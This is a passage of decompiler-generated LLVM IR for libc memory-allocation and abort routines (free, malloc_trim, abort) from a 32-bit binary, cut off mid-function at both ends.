  br i1 %v15_804abc9, label %dec_label_pc_804ac4d, label %dec_label_pc_804abcf

dec_label_pc_804abcf:                             ; preds = %dec_label_pc_804abc5
  %v4_804abcf = add i32 %v0_804ab05, 4
  br label %dec_label_pc_804aaf7

dec_label_pc_804abd9:                             ; preds = %dec_label_pc_804abe8.preheader, %dec_label_pc_804abd9
  %v1_804abdd20 = phi i32 [ 1, %dec_label_pc_804abe8.preheader ], [ %v0_804abe8.pre, %dec_label_pc_804abd9 ]
  %v2_804abdd = mul i32 %v1_804abdd20, 8
  %v4_804abdd = add i32 %v3_804abdd, %v2_804abdd
  store i32 %v4_804abdd, i32* %eax.global-to-local, align 4
  %v1_804abe1 = add i32 %v1_804abdd20, 1
  store i32 %v1_804abe1, i32* %edx.global-to-local, align 4
  %v2_804abe2 = add i32 %v4_804abdd, 12
  %v3_804abe2 = inttoptr i32 %v2_804abe2 to i32*
  store i32 %v4_804abdd, i32* %v3_804abe2, align 4
  %v0_804abe5 = load i32, i32* %eax.global-to-local, align 4
  %v2_804abe5 = add i32 %v0_804abe5, 8
  %v3_804abe5 = inttoptr i32 %v2_804abe5 to i32*
  store i32 %v0_804abe5, i32* %v3_804abe5, align 4
  %v0_804abe8.pre = load i32, i32* %edx.global-to-local, align 4
  %v7_804abeb = icmp sgt i32 %v0_804abe8.pre, 95
  br i1 %v7_804abeb, label %dec_label_pc_804abed, label %dec_label_pc_804abd9

dec_label_pc_804abed:                             ; preds = %dec_label_pc_804abd9
  store i32 %tmp11, i32* %eax.global-to-local, align 4
  %v1_804abf1 = add i32 %tmp11, 864
  %v2_804abf1 = inttoptr i32 %v1_804abf1 to i32*
  %v3_804abf1 = load i32, i32* %v2_804abf1, align 4
  %v4_804abf1 = or i32 %v3_804abf1, 1
  store i32 %v4_804abf1, i32* %v2_804abf1, align 4
  %v0_804abf8 = load i32, i32* %eax.global-to-local, align 4
  %v1_804abf8 = add i32 %v0_804abf8, 840
  %v2_804abf8 = inttoptr i32 %v1_804abf8 to i32*
  store i32 0, i32* %v2_804abf8, align 4
  %v0_804ac02 = load i32, i32* %eax.global-to-local, align 4
  %v1_804ac02 = add i32 %v0_804ac02, 852
  %v2_804ac02 = inttoptr i32 %v1_804ac02 to i32*
  store i32 65536, i32* %v2_804ac02, align 4
  %v0_804ac0c = load i32, i32* %eax.global-to-local, align 4
  %v1_804ac0c = add i32 %v0_804ac0c, 844
  %v2_804ac0c = inttoptr i32 %v1_804ac0c to i32*
  store i32 262144, i32* %v2_804ac0c, align 4
  %v0_804ac16 = load i32, i32* %eax.global-to-local, align 4
  %v1_804ac16 = add i32 %v0_804ac16, 836
  %v2_804ac16 = inttoptr i32 %v1_804ac16 to i32*
  store i32 262144, i32* %v2_804ac16, align 4
  store i32 %tmp11, i32* @edx, align 4
  %v2_804ac27 = load i32, i32* %arg1, align 4
  %v1_804ac29 = urem i32 %v2_804ac27, 4
  %v1_804ac2c = or i32 %v1_804ac29, 72
  store i32 %v1_804ac2c, i32* %arg1, align 4
  %v0_804ac31 = load i32, i32* @edx, align 4
  %v1_804ac33 = add i32 %v0_804ac31, 52
  store i32 %v1_804ac33, i32* %eax.global-to-local, align 4
  %v2_804ac36 = add i32 %v0_804ac31, 44
  %v3_804ac36 = inttoptr i32 %v2_804ac36 to i32*
  store i32 %v1_804ac33, i32* %v3_804ac36, align 4
  %v1_804ac3b = call i32 @sysconf(i32 30)
  store i32 %v1_804ac3b, i32* %eax.global-to-local, align 4
  store i32 %tmp11, i32* @ecx, align 4
  %v2_804ac47 = add i32 %tmp11, 860
  %v3_804ac47 = inttoptr i32 %v2_804ac47 to i32*
  store i32 %v1_804ac3b, i32* %v3_804ac47, align 4
  br label %dec_label_pc_804ac4d

dec_label_pc_804ac4d:                             ; preds = %dec_label_pc_804abc5, %dec_label_pc_804abed
  store i32 %v0_804aab0, i32* @ebx, align 4
  store i32 %v0_804aaaf, i32* @esi, align 4
  store i32 %v0_804aaae, i32* @edi, align 4
  %v0_804ac54 = load i32, i32* %eax.global-to-local, align 4
  ret i32 %v0_804ac54

; uselistorder directives
  uselistorder i32 %v0_804abe5, { 1, 0 }
  uselistorder i32 %v0_804aba4, { 1, 0 }
  uselistorder i32 %v1_804ab5f, { 1, 0 }
  uselistorder i32 %v2_804ab58, { 1, 0 }
  uselistorder i32 %v1_804ab50, { 0, 2, 1, 3 }
  uselistorder i32 %v1_804ab5c, { 1, 0 }
  uselistorder i32 %v3_804ab0b, { 2, 1, 3, 0 }
  uselistorder i32 %v0_804ab28, { 2, 1, 0, 4, 3 }
  uselistorder i32 %v0_804ab05, { 1, 0, 3, 2 }
  uselistorder i32* %v3_804abb6, { 1, 0 }
  uselistorder i32 %v1_804aad0, { 1, 0 }
  uselistorder i32 %tmp11, { 3, 14, 13, 11, 10, 8, 7, 1, 9, 2, 6, 5, 0, 12, 4 }
  uselistorder i32* %ebp.global-to-local, { 1, 0, 2 }
  uselistorder i32* %eax.global-to-local, { 24, 0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 17, 18, 15, 16, 19, 20, 21, 22, 23, 25, 26, 27, 28 }
  uselistorder i32 860, { 1, 0 }
  uselistorder label %dec_label_pc_804ac4d, { 1, 0 }
  uselistorder label %dec_label_pc_804abd9, { 1, 0 }
  uselistorder label %dec_label_pc_804abb9, { 1, 0 }
  uselistorder label %dec_label_pc_804ab85, { 1, 0 }
  uselistorder label %dec_label_pc_804ab7d, { 1, 0 }
  uselistorder label %dec_label_pc_804ab48, { 1, 0 }
}

define i32 @free(i32 %arg1) local_unnamed_addr {
entry:
  %eax.global-to-local = alloca i32, align 4
  %stack_var_-32 = alloca i32, align 4
  %v0_804ac55 = load i32, i32* @ebp, align 4
  %v0_804ac56 = load i32, i32* @edi, align 4
  %v0_804ac57 = load i32, i32* @esi, align 4
  %v0_804ac58 = load i32, i32* @ebx, align 4
  store i32 %arg1, i32* @edi, align 4
  %v1_804ac60 = icmp eq i32 %arg1, 0
  br i1 %v1_804ac60, label %dec_label_pc_804ade9, label %dec_label_pc_804ac68

dec_label_pc_804ac68:                             ; preds = %entry
  %v2_804ac73 = ptrtoint i32* %stack_var_-32 to i32
  store i32 %v2_804ac73, i32* @eax, align 4
  %v2_804ac78 = call i32 @__pthread_return_void(i32 %v2_804ac73, i32 134526427)
  store i32 %v2_804ac78, i32* %eax.global-to-local, align 4
  %v1_804ac84 = call i32 @__pthread_return_0(i32 ptrtoint (i32* @global_var_8052044.36 to i32))
  %v1_804ac89 = add i32 %arg1, -8
  store i32 %v1_804ac89, i32* @ecx, align 4
  %v0_804ac8c = load i8, i8* @global_var_8054600.37, align 1
  %v1_804ac8c = sext i8 %v0_804ac8c to i32
  store i32 %v1_804ac8c, i32* %eax.global-to-local, align 4
  %v1_804ac94 = add i32 %arg1, -4
  %v2_804ac94 = inttoptr i32 %v1_804ac94 to i32*
  %v3_804ac94 = load i32, i32* %v2_804ac94, align 4
  %v1_804ac99 = and i32 %v3_804ac94, -4
  %v4_804ac99 = trunc i32 %v1_804ac99 to i8
  store i32 %v1_804ac99, i32* @ebx, align 4
  %v8_804ac9e = icmp ugt i8 %v4_804ac99, %v0_804ac8c
  br i1 %v8_804ac9e, label %dec_label_pc_804acc0, label %dec_label_pc_804aca0

dec_label_pc_804aca0:                             ; preds = %dec_label_pc_804ac68
  %v2_804aca0 = udiv i32 %v3_804ac94, 8
  %v1_804aca3 = or i32 %v1_804ac8c, 3
  %v3_804aca3 = trunc i32 %v1_804aca3 to i8
  store i32 %v1_804aca3, i32* %eax.global-to-local, align 4
  store i8 %v3_804aca3, i8* @global_var_8054600.37, align 512
  %v1_804acab = mul nuw i32 %v2_804aca0, 4
  %v2_804acab = add i32 %v1_804acab, ptrtoint (i8* @global_var_8054600.37 to i32)
  store i32 %v2_804acab, i32* @edx, align 4
  %v1_804acb2 = add i32 %v1_804acab, add (i32 ptrtoint (i8* @global_var_8054600.37 to i32), i32 -4)
  %v2_804acb2 = inttoptr i32 %v1_804acb2 to i32*
  %v3_804acb2 = load i32, i32* %v2_804acb2, align 4
  store i32 %v3_804acb2, i32* %eax.global-to-local, align 4
  %v3_804acb5 = inttoptr i32 %arg1 to i32*
  store i32 %v3_804acb2, i32* %v3_804acb5, align 4
  %v0_804acb8 = load i32, i32* @ecx, align 4
  %v1_804acb8 = load i32, i32* @edx, align 4
  %v2_804acb8 = add i32 %v1_804acb8, -4
  %v3_804acb8 = inttoptr i32 %v2_804acb8 to i32*
  store i32 %v0_804acb8, i32* %v3_804acb8, align 4
  br label %dec_label_pc_804add8

dec_label_pc_804acc0:                             ; preds = %dec_label_pc_804ac68
  %v1_804acc0 = trunc i32 %v3_804ac94 to i8
  %v2_804acc0 = and i8 %v1_804acc0, 2
  %v3_804acc0 = icmp eq i8 %v2_804acc0, 0
  %v5_804acc0 = zext i8 %v2_804acc0 to i32
  %v7_804acc0 = and i32 %v3_804ac94, -256
  %v8_804acc0 = or i32 %v5_804acc0, %v7_804acc0
  store i32 %v8_804acc0, i32* @edx, align 4
  %v1_804acc3 = icmp eq i1 %v3_804acc0, false
  br i1 %v1_804acc3, label %dec_label_pc_804adb8, label %dec_label_pc_804acc9

dec_label_pc_804acc9:                             ; preds = %dec_label_pc_804acc0
  %v1_804acc9 = or i32 %v1_804ac8c, 1
  %v3_804acc9 = trunc i32 %v1_804acc9 to i8
  store i32 %v1_804acc9, i32* %eax.global-to-local, align 4
  %v2_804accc = add i32 %v1_804ac99, %v1_804ac89
  store i32 %v2_804accc, i32* @esi, align 4
  store i8 %v3_804acc9, i8* @global_var_8054600.37, align 512
  %v1_804acd4 = add i32 %v2_804accc, 4
  %v2_804acd4 = inttoptr i32 %v1_804acd4 to i32*
  %v3_804acd4 = load i32, i32* %v2_804acd4, align 4
  store i32 %v3_804acd4, i32* %eax.global-to-local, align 4
  %v2_804acdb = inttoptr i32 %v1_804ac94 to i8*
  %v3_804acdb = load i8, i8* %v2_804acdb, align 1
  %v4_804acdb = urem i8 %v3_804acdb, 2
  %v5_804acdb = icmp eq i8 %v4_804acdb, 0
  %v1_804acdf = icmp eq i1 %v5_804acdb, false
  br i1 %v1_804acdf, label %dec_label_pc_804ad02, label %dec_label_pc_804ace1

dec_label_pc_804ace1:                             ; preds = %dec_label_pc_804acc9
  %v2_804ace1 = inttoptr i32 %v1_804ac89 to i32*
  %v3_804ace1 = load i32, i32* %v2_804ace1, align 4
  store i32 %v3_804ace1, i32* @ebp, align 4
  %v2_804ace6 = sub i32 %v1_804ac89, %v3_804ace1
  store i32 %v2_804ace6, i32* %eax.global-to-local, align 4
  %v1_804ace8 = add i32 %v2_804ace6, 8
  %v2_804ace8 = inttoptr i32 %v1_804ace8 to i32*
  %v3_804ace8 = load i32, i32* %v2_804ace8, align 4
  store i32 %v3_804ace8, i32* @edi, align 4
  %v1_804aceb = add i32 %v2_804ace6, 12
  %v2_804aceb = inttoptr i32 %v1_804aceb to i32*
  %v3_804aceb = load i32, i32* %v2_804aceb, align 4
  store i32 %v3_804aceb, i32* @edx, align 4
  %v1_804acee = add i32 %v3_804ace8, 12
  %v2_804acee = inttoptr i32 %v1_804acee to i32*
  %v3_804acee = load i32, i32* %v2_804acee, align 4
  store i32 %v3_804acee, i32* @ecx, align 4
  %v12_804acf1 = icmp eq i32 %v3_804acee, %v2_804ace6
  %v1_804acf3 = icmp eq i1 %v12_804acf1, false
  br i1 %v1_804acf3, label %dec_label_pc_804ad31, label %dec_label_pc_804acf5

dec_label_pc_804acf5:                             ; preds = %dec_label_pc_804ace1
  %v1_804acf5 = add i32 %v3_804aceb, 8
  %v2_804acf5 = inttoptr i32 %v1_804acf5 to i32*
  %v3_804acf5 = load i32, i32* %v2_804acf5, align 4
  %v15_804acf5 = icmp eq i32 %v3_804acf5, %v3_804acee
  %v1_804acf8 = icmp eq i1 %v15_804acf5, false
  br i1 %v1_804acf8, label %dec_label_pc_804ad31, label %dec_label_pc_804acfa

dec_label_pc_804acfa:                             ; preds = %dec_label_pc_804acf5
  %v2_804acfa = add i32 %v3_804ace1, %v1_804ac99
  store i32 %v2_804acfa, i32* @ebx, align 4
  store i32 %v3_804aceb, i32* %v2_804acee, align 4
  %v0_804acff = load i32, i32* @edi, align 4
  %v1_804acff = load i32, i32* @edx, align 4
  %v2_804acff = add i32 %v1_804acff, 8
  %v3_804acff = inttoptr i32 %v2_804acff to i32*
  store i32 %v0_804acff, i32* %v3_804acff, align 4
  %v0_804ad09.pre = load i32, i32* @esi, align 4
  br label %dec_label_pc_804ad02

dec_label_pc_804ad02:                             ; preds = %dec_label_pc_804acc9, %dec_label_pc_804acfa
  %v1_804ad15 = phi i32 [ %v2_804accc, %dec_label_pc_804acc9 ], [ %v0_804ad09.pre, %dec_label_pc_804acfa ]
  %v1_804ad06 = and i32 %v3_804acd4, -4
  store i32 %v1_804ad06, i32* @ebp, align 4
  %v1_804ad09 = load i32, i32* @global_var_805462c.38, align 4
  %v12_804ad09 = icmp eq i32 %v1_804ad15, %v1_804ad09
  br i1 %v12_804ad09, label %dec_label_pc_804ad63, label %dec_label_pc_804ad11

dec_label_pc_804ad11:                             ; preds = %dec_label_pc_804ad02
  %v2_804ad11 = add i32 %v1_804ad15, 4
  %v3_804ad11 = add i32 %v2_804ad11, %v1_804ad06
  %v4_804ad11 = inttoptr i32 %v3_804ad11 to i32*
  %v5_804ad11 = load i32, i32* %v4_804ad11, align 4
  store i32 %v5_804ad11, i32* %eax.global-to-local, align 4
  %v3_804ad15 = inttoptr i32 %v2_804ad11 to i32*
  store i32 %v1_804ad06, i32* %v3_804ad15, align 4
  %v0_804ad18 = load i32, i32* %eax.global-to-local, align 4
  %v1_804ad18 = urem i32 %v0_804ad18, 2
  %v2_804ad18 = icmp eq i32 %v1_804ad18, 0
  store i32 %v1_804ad18, i32* %eax.global-to-local, align 4
  %v1_804ad1d = icmp eq i1 %v2_804ad18, false
  br i1 %v1_804ad1d, label %dec_label_pc_804ad3e, label %dec_label_pc_804ad1f

dec_label_pc_804ad1f:                             ; preds = %dec_label_pc_804ad11
  %v0_804ad1f = load i32, i32* @esi, align 4
  %v1_804ad1f = add i32 %v0_804ad1f, 8
  %v2_804ad1f = inttoptr i32 %v1_804ad1f to i32*
  %v3_804ad1f = load i32, i32* %v2_804ad1f, align 4
  store i32 %v3_804ad1f, i32* @edx, align 4
  %v1_804ad22 = add i32 %v0_804ad1f, 12
  %v2_804ad22 = inttoptr i32 %v1_804ad22 to i32*
  %v3_804ad22 = load i32, i32* %v2_804ad22, align 4
  store i32 %v3_804ad22, i32* %eax.global-to-local, align 4
  %v1_804ad25 = add i32 %v3_804ad1f, 12
  %v2_804ad25 = inttoptr i32 %v1_804ad25 to i32*
  %v3_804ad25 = load i32, i32* %v2_804ad25, align 4
  store i32 %v3_804ad25, i32* @edi, align 4
  %v12_804ad28 = icmp eq i32 %v3_804ad25, %v0_804ad1f
  %v1_804ad2a = icmp eq i1 %v12_804ad28, false
  br i1 %v1_804ad2a, label %dec_label_pc_804ad31, label %dec_label_pc_804ad2c

dec_label_pc_804ad2c:                             ; preds = %dec_label_pc_804ad1f
  %v1_804ad2c = add i32 %v3_804ad22, 8
  %v2_804ad2c = inttoptr i32 %v1_804ad2c to i32*
  %v3_804ad2c = load i32, i32* %v2_804ad2c, align 4
  %v15_804ad2c = icmp eq i32 %v3_804ad2c, %v3_804ad25
  br i1 %v15_804ad2c, label %dec_label_pc_804ad36, label %dec_label_pc_804ad31

dec_label_pc_804ad31:                             ; preds = %dec_label_pc_804ad2c, %dec_label_pc_804ad1f, %dec_label_pc_804acf5, %dec_label_pc_804ace1
  %v0_804ad31 = call i32 @abort()
  store i32 %v0_804ad31, i32* %eax.global-to-local, align 4
  %v1_804ad36.pre = load i32, i32* @edx, align 4
  br label %dec_label_pc_804ad36

dec_label_pc_804ad36:                             ; preds = %dec_label_pc_804ad2c, %dec_label_pc_804ad31
  %v1_804ad36 = phi i32 [ %v3_804ad1f, %dec_label_pc_804ad2c ], [ %v1_804ad36.pre, %dec_label_pc_804ad31 ]
  %v0_804ad36 = phi i32 [ %v3_804ad22, %dec_label_pc_804ad2c ], [ %v0_804ad31, %dec_label_pc_804ad31 ]
  %v2_804ad36 = add i32 %v1_804ad36, 12
  %v3_804ad36 = inttoptr i32 %v2_804ad36 to i32*
  store i32 %v0_804ad36, i32* %v3_804ad36, align 4
  %v0_804ad39 = load i32, i32* @edx, align 4
  %v1_804ad39 = load i32, i32* %eax.global-to-local, align 4
  %v2_804ad39 = add i32 %v1_804ad39, 8
  %v3_804ad39 = inttoptr i32 %v2_804ad39 to i32*
  store i32 %v0_804ad39, i32* %v3_804ad39, align 4
  %v0_804ad3c = load i32, i32* @ebx, align 4
  %v1_804ad3c = load i32, i32* @ebp, align 4
  %v2_804ad3c = add i32 %v1_804ad3c, %v0_804ad3c
  store i32 %v2_804ad3c, i32* @ebx, align 4
  br label %dec_label_pc_804ad3e

dec_label_pc_804ad3e:                             ; preds = %dec_label_pc_804ad11, %dec_label_pc_804ad36
  %v0_804ad3e = load i32, i32* @global_var_805463c.56, align 4
  store i32 %v0_804ad3e, i32* %eax.global-to-local, align 4
  %v0_804ad43 = load i32, i32* @ecx, align 4
  %v1_804ad43 = add i32 %v0_804ad43, 12
  %v2_804ad43 = inttoptr i32 %v1_804ad43 to i32*
  store i32 ptrtoint (i32* @global_var_8054634.40 to i32), i32* %v2_804ad43, align 4
  %v0_804ad4a = load i32, i32* %eax.global-to-local, align 4
  %v1_804ad4a = load i32, i32* @ecx, align 4
  %v2_804ad4a = add i32 %v1_804ad4a, 8
  %v3_804ad4a = inttoptr i32 %v2_804ad4a to i32*
  store i32 %v0_804ad4a, i32* %v3_804ad4a, align 4
  %v0_804ad4d = load i32, i32* @ebx, align 4
  %v1_804ad4d = load i32, i32* @ecx, align 4
  %v3_804ad4d = add i32 %v1_804ad4d, %v0_804ad4d
  %v4_804ad4d = inttoptr i32 %v3_804ad4d to i32*
  store i32 %v0_804ad4d, i32* %v4_804ad4d, align 4
  %v0_804ad50 = load i32, i32* @ecx, align 4
  %v1_804ad50 = load i32, i32* %eax.global-to-local, align 4
  %v2_804ad50 = add i32 %v1_804ad50, 12
  %v3_804ad50 = inttoptr i32 %v2_804ad50 to i32*
  store i32 %v0_804ad50, i32* %v3_804ad50, align 4
  %v0_804ad53 = load i32, i32* @ebx, align 4
  %v1_804ad55 = or i32 %v0_804ad53, 1
  store i32 %v1_804ad55, i32* %eax.global-to-local, align 4
  %v0_804ad58 = load i32, i32* @ecx, align 4
  store i32 %v0_804ad58, i32* @global_var_805463c.56, align 4
  %v2_804ad5e = add i32 %v0_804ad58, 4
  %v3_804ad5e = inttoptr i32 %v2_804ad5e to i32*
  store i32 %v1_804ad55, i32* %v3_804ad5e, align 4
  br label %dec_label_pc_804ad73

dec_label_pc_804ad63:                             ; preds = %dec_label_pc_804ad02
  %v0_804ad63 = load i32, i32* @ebx, align 4
  %v2_804ad63 = add i32 %v0_804ad63, %v1_804ad06
  store i32 %v2_804ad63, i32* @ebx, align 4
  %v1_804ad67 = or i32 %v2_804ad63, 1
  store i32 %v1_804ad67, i32* %eax.global-to-local, align 4
  %v1_804ad6a = load i32, i32* @ecx, align 4
  %v2_804ad6a = add i32 %v1_804ad6a, 4
  %v3_804ad6a = inttoptr i32 %v2_804ad6a to i32*
  store i32 %v1_804ad67, i32* %v3_804ad6a, align 4
  %v0_804ad6d = load i32, i32* @ecx, align 4
  store i32 %v0_804ad6d, i32* @global_var_805462c.38, align 4
  br label %dec_label_pc_804ad73

dec_label_pc_804ad73:                             ; preds = %dec_label_pc_804ad3e, %dec_label_pc_804ad63
  %v0_804ad73 = load i32, i32* @ebx, align 4
  %tmp21 = icmp ult i32 %v0_804ad73, 131072
  br i1 %tmp21, label %dec_label_pc_804add8, label %dec_label_pc_804ad7b

dec_label_pc_804ad7b:                             ; preds = %dec_label_pc_804ad73
  %v0_804ad7b = load i8, i8* @global_var_8054600.37, align 512
  %v1_804ad7b = and i8 %v0_804ad7b, 2
  %v2_804ad7b = icmp eq i8 %v1_804ad7b, 0
  br i1 %v2_804ad7b, label %dec_label_pc_804ad94, label %dec_label_pc_804ad84

dec_label_pc_804ad84:                             ; preds = %dec_label_pc_804ad7b
  %v2_804ad8c = call i32 @__malloc_consolidate(i32* bitcast (i8* @global_var_8054600.37 to i32*))
  store i32 %v2_804ad8c, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_804ad94

dec_label_pc_804ad94:                             ; preds = %dec_label_pc_804ad7b, %dec_label_pc_804ad84
  %v0_804ad94 = load i32, i32* @global_var_805462c.38, align 4
  store i32 %v0_804ad94, i32* %eax.global-to-local, align 4
  %v1_804ad99 = add i32 %v0_804ad94, 4
  %v2_804ad99 = inttoptr i32 %v1_804ad99 to i32*
  %v3_804ad99 = load i32, i32* %v2_804ad99, align 4
  %v1_804ad9c = and i32 %v3_804ad99, -4
  store i32 %v1_804ad9c, i32* %eax.global-to-local, align 4
  %v1_804ad9f = load i32, i32* @global_var_8054944.54, align 4
  %v7_804ad9f = icmp ult i32 %v1_804ad9c, %v1_804ad9f
  br i1 %v7_804ad9f, label %dec_label_pc_804add8, label %dec_label_pc_804ada7

dec_label_pc_804ada7:                             ; preds = %dec_label_pc_804ad94
  store i32 ptrtoint (i8* @global_var_8054600.37 to i32), i32* @edx, align 4
  %v0_804adac = load i32, i32* @global_var_8054948.52, align 8
  store i32 %v0_804adac, i32* @eax, align 4
  %v0_804adb1 = call i32 @__malloc_trim()
  store i32 %v0_804adb1, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_804add8

dec_label_pc_804adb8:                             ; preds = %dec_label_pc_804acc0
  %v2_804adb8 = inttoptr i32 %v1_804ac89 to i32*
  %v3_804adb8 = load i32, i32* %v2_804adb8, align 4
  %v0_804adbb = load i32, i32* @global_var_8054950.45, align 16
  %v1_804adbb = add i32 %v0_804adbb, -1
  store i32 %v1_804adbb, i32* @global_var_8054950.45, align 16
  %v2_804adc1 = add i32 %v3_804adb8, %v1_804ac99
  store i32 %v2_804adc1, i32* %eax.global-to-local, align 4
  %v2_804adc4 = sub i32 %v1_804ac89, %v3_804adb8
  %v0_804adca = load i32, i32* @global_var_8054964.48, align 4
  %v2_804adca = sub i32 %v0_804adca, %v2_804adc1
  store i32 %v2_804adca, i32* @global_var_8054964.48, align 4
  %v4_804add0 = call i32 @munmap(i32 %v2_804adc4, i32 %v2_804adc1, i32 %v1_804ac99, i32 %v1_804ac99)
  store i32 %v4_804add0, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_804add8

dec_label_pc_804add8:                             ; preds = %dec_label_pc_804ad94, %dec_label_pc_804ad73, %dec_label_pc_804ada7, %dec_label_pc_804aca0, %dec_label_pc_804adb8
  store i32 %v2_804ac73, i32* @eax, align 4
  %v2_804ade1 = call i32 @__pthread_return_void(i32 %v2_804ac73, i32 1)
  store i32 %v2_804ade1, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_804ade9

dec_label_pc_804ade9:                             ; preds = %entry, %dec_label_pc_804add8
  %.0 = phi i32 [ undef, %entry ], [ %v2_804ade1, %dec_label_pc_804add8 ]
  store i32 %v0_804ac58, i32* @ebx, align 4
  store i32 %v0_804ac57, i32* @esi, align 4
  store i32 %v0_804ac56, i32* @edi, align 4
  store i32 %v0_804ac55, i32* @ebp, align 4
  ret i32 %.0

; uselistorder directives
  uselistorder i32 %v3_804adb8, { 1, 0 }
  uselistorder i32 %v0_804ad4d, { 1, 0 }
  uselistorder i32 %v1_804ad18, { 1, 0 }
  uselistorder i32 %v2_804ad11, { 1, 0 }
  uselistorder i32 %v1_804ad06, { 0, 2, 1, 3 }
  uselistorder i32 %v1_804ad15, { 1, 0 }
  uselistorder i32 %v1_804ac99, { 3, 4, 0, 1, 2, 5, 6 }
  uselistorder i32 %v3_804ac94, { 1, 2, 0, 3 }
  uselistorder i32 %v1_804ac89, { 1, 4, 2, 3, 0, 5 }
  uselistorder i32* %eax.global-to-local, { 0, 1, 2, 12, 10, 11, 13, 14, 15, 16, 17, 18, 21, 22, 19, 20, 23, 24, 3, 4, 5, 6, 7, 8, 9 }
  uselistorder i32* bitcast (i8* @global_var_8054600.37 to i32*), { 0, 2, 1, 3 }
  uselistorder i32 ptrtoint (i32* @global_var_8054634.40 to i32), { 1, 2, 3, 4, 5, 6, 7, 0, 8 }
  uselistorder i32* @global_var_805462c.38, { 1, 2, 3, 4, 5, 6, 0, 7, 8, 9 }
  uselistorder i32 %arg1, { 1, 0, 4, 3, 2 }
  uselistorder label %dec_label_pc_804ade9, { 1, 0 }
  uselistorder label %dec_label_pc_804add8, { 4, 2, 0, 1, 3 }
  uselistorder label %dec_label_pc_804ad94, { 1, 0 }
  uselistorder label %dec_label_pc_804ad73, { 1, 0 }
  uselistorder label %dec_label_pc_804ad3e, { 1, 0 }
  uselistorder label %dec_label_pc_804ad36, { 1, 0 }
  uselistorder label %dec_label_pc_804ad02, { 1, 0 }
}

define i32 @malloc_trim(i32 %arg1) local_unnamed_addr {
entry:
  %v0_804adf1 = load i32, i32* @ebx, align 4
  store i32 %arg1, i32* @ebx, align 4
  %v3_804adfe = call i32 @__malloc_consolidate(i32* inttoptr (i32 sext (i8 ptrtoint (i8* @global_var_8054600.37 to i8) to i32) to i32*))
  %v0_804ae03 = load i32, i32* @ebx, align 4
  store i32 %v0_804ae03, i32* @eax, align 4
  store i32 ptrtoint (i8* @global_var_8054600.37 to i32), i32* @edx, align 4
  store i32 %v0_804adf1, i32* @ebx, align 4
  %v0_804ae0e = call i32 @__malloc_trim()
  ret i32 %v0_804ae0e

; uselistorder directives
  uselistorder i32 ()* @__malloc_trim, { 1, 0 }
  uselistorder i32 ptrtoint (i8* @global_var_8054600.37 to i32), { 8, 7, 6, 0, 5, 4, 1, 3, 2 }
  uselistorder i32 (i32*)* @__malloc_consolidate, { 0, 3, 1, 2, 4 }
  uselistorder i8* @global_var_8054600.37, { 0, 5, 8, 7, 6, 4, 1, 3, 2 }
}

define i32 @abort() local_unnamed_addr {
entry:
  %eax.global-to-local = alloca i32, align 4
  %stack_var_-272 = alloca i32, align 4
  %stack_var_-132 = alloca i32, align 4
  %stack_var_-284 = alloca i32, align 4
  %v1_804ae20 = call i32 @__pthread_return_0(i32 ptrtoint (i32* @global_var_805205c.57 to i32))
  %v12_804ae2a = ptrtoint i32* %stack_var_-284 to i32
  store i32 31, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_804ae2f

dec_label_pc_804ae2f:                             ; preds = %dec_label_pc_804ae2f.dec_label_pc_804ae2f_crit_edge, %entry
  %v0_804ae2f = phi i32 [ %v12_804ae2a, %entry ], [ %v0_804ae2f.pre, %dec_label_pc_804ae2f.dec_label_pc_804ae2f_crit_edge ]
  %v1_804ae3a22 = phi i32 [ 31, %entry ], [ %v1_804ae3a, %dec_label_pc_804ae2f.dec_label_pc_804ae2f_crit_edge ]
  %v2_804ae2f = mul i32 %v1_804ae3a22, 4
  %v3_804ae2f = add i32 %v2_804ae2f, 152
  %v4_804ae2f = add i32 %v3_804ae2f, %v0_804ae2f
  %v5_804ae2f = inttoptr i32 %v4_804ae2f to i32*
  store i32 0, i32* %v5_804ae2f, align 4
  %v0_804ae3a.pre = load i32, i32* %eax.global-to-local, align 4
  %v1_804ae3a = add i32 %v0_804ae3a.pre, -1
  %v9_804ae3a = icmp slt i32 %v1_804ae3a, 0
  store i32 %v1_804ae3a, i32* %eax.global-to-local, align 4
  %v1_804ae3b = icmp eq i1 %v9_804ae3a, false
  br i1 %v1_804ae3b, label %dec_label_pc_804ae2f.dec_label_pc_804ae2f_crit_edge, label %dec_label_pc_804ae3d

dec_label_pc_804ae2f.dec_label_pc_804ae2f_crit_edge: ; preds = %dec_label_pc_804ae2f
  %v0_804ae2f.pre = load i32, i32* @esp, align 4
  br label %dec_label_pc_804ae2f

dec_label_pc_804ae3d:                             ; preds = %dec_label_pc_804ae2f
  %v0_804ae3d = load i32, i32* @ebx, align 4
  %v2_804ae41 = ptrtoint i32* %stack_var_-132 to i32
  store i32 %v2_804ae41, i32* @ebx, align 4
  %v4_804ae49 = call i32 @__sigaddset(i32 %v2_804ae41, i32 6, i32 %v0_804ae3d, i32 %v0_804ae3d)
  store i32 %v4_804ae49, i32* %eax.global-to-local, align 4
  %v1_804ae51 = icmp eq i32 %v4_804ae49, 0
  %v1_804ae53 = icmp eq i1 %v1_804ae51, false
  br i1 %v1_804ae53, label %dec_label_pc_804ae63, label %dec_label_pc_804ae55

dec_label_pc_804ae55:                             ; preds = %dec_label_pc_804ae3d
  %v0_804ae55 = load i32, i32* @ecx, align 4
  %v4_804ae5b = bitcast i32* %stack_var_-132 to %_TYPEDEF_sigset_t*
  %v5_804ae5b = call i32 @__GI_sigprocmask(i32 1, %_TYPEDEF_sigset_t* %v4_804ae5b, i32 0, i32 %v0_804ae55)
  store i32 %v5_804ae5b, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_804ae63

dec_label_pc_804ae63:                             ; preds = %dec_label_pc_804ae3d, %dec_label_pc_804ae55
  %v2_804ae9b4 = phi i32 [ %v4_804ae49, %dec_label_pc_804ae3d ], [ %v5_804ae5b, %dec_label_pc_804ae55 ]
  %v0_804ae63 = load i8, i8* @global_var_8052500.58, align 256
  %v1_804ae63 = icmp eq i8 %v0_804ae63, 0
  %v1_804ae6a = icmp eq i1 %v1_804ae63, false
  br i1 %v1_804ae6a, label %dec_label_pc_804ae9b, label %dec_label_pc_804ae6c

dec_label_pc_804ae6c:                             ; preds = %dec_label_pc_804ae63
  store i8 1, i8* @global_var_8052500.58, align 256
  br label %dec_label_pc_804ae73

